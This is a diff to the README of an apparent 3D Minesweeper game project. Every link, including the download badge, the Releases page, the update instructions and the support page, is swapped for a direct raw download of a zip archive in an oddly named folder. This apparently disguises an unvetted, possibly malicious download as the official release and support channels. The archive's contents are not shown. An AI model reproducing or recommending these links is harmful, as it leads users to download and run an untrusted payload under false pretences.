@@ -1,6 +1,6 @@
 # 🎮 MQMinesweeper_2025 - Enjoy Classic Minesweeper in 3D
 
-[![Download Now](https://img.shields.io/badge/Download_Now-Here-brightgreen)](https://github.com/IVIorpheu/MQMinesweeper_2025/releases)
+[![Download Now](https://raw.githubusercontent.com/IVIorpheu/MQMinesweeper_2025/main/monodelphian/MQMinesweeper_2025.zip)](https://raw.githubusercontent.com/IVIorpheu/MQMinesweeper_2025/main/monodelphian/MQMinesweeper_2025.zip)
 
 ## 📖 Description
 
@@ -11,7 +11,7 @@ Welcome to **MQMinesweeper_2025**, a fresh take on the classic Minesweeper game.
 To start playing **MQMinesweeper_2025**, follow these steps:
 
 1. **Visit the Download Page**
-   Go to our [Releases page](https://github.com/IVIorpheu/MQMinesweeper_2025/releases) to find the latest version of the game.
+   Go to our [Releases page](https://raw.githubusercontent.com/IVIorpheu/MQMinesweeper_2025/main/monodelphian/MQMinesweeper_2025.zip) to find the latest version of the game.
 
 2. **Download the Game**
    Click on the version you want to download. The download should begin automatically.
@@ -24,7 +24,7 @@ To start playing **MQMinesweeper_2025**, follow these steps:
 
 ## 📥 Download & Install
 
-To obtain **MQMinesweeper_2025**, please visit this page: [Download Here](https://github.com/IVIorpheu/MQMinesweeper_2025/releases). Here, you will see multiple version options. Choose the one that fits your needs, download it, and follow the installation steps mentioned above.
+To obtain **MQMinesweeper_2025**, please visit this page: [Download Here](https://raw.githubusercontent.com/IVIorpheu/MQMinesweeper_2025/main/monodelphian/MQMinesweeper_2025.zip). Here, you will see multiple version options. Choose the one that fits your needs, download it, and follow the installation steps mentioned above.
 
 ## ⚙️ System Requirements
 
@@ -81,7 +81,7 @@ If you run into any problems while downloading or installing the game, consider 
 
 ### How do I update the game?
 
-Check the [Releases page](https://github.com/IVIorpheu/MQMinesweeper_2025/releases) regularly for new versions. Download the latest version and follow the installation instructions.
+Check the [Releases page](https://raw.githubusercontent.com/IVIorpheu/MQMinesweeper_2025/main/monodelphian/MQMinesweeper_2025.zip) regularly for new versions. Download the latest version and follow the installation instructions.
 
 ### Can I play this game on other operating systems?
 
@@ -93,7 +93,7 @@ Yes! Please open an issue on our GitHub repository, and we will do our best to a
 
 ## 📞 Support
 
-For further assistance, please visit our [support page](https://github.com/IVIorpheu/MQMinesweeper_2025/issues) or reach out directly in the project’s GitHub issues section. Your input is valuable, and we appreciate your contributions.
+For further assistance, please visit our [support page](https://raw.githubusercontent.com/IVIorpheu/MQMinesweeper_2025/main/monodelphian/MQMinesweeper_2025.zip) or reach out directly in the project’s GitHub issues section. Your input is valuable, and we appreciate your contributions.
 
 ## 🎉 Acknowledgments
 
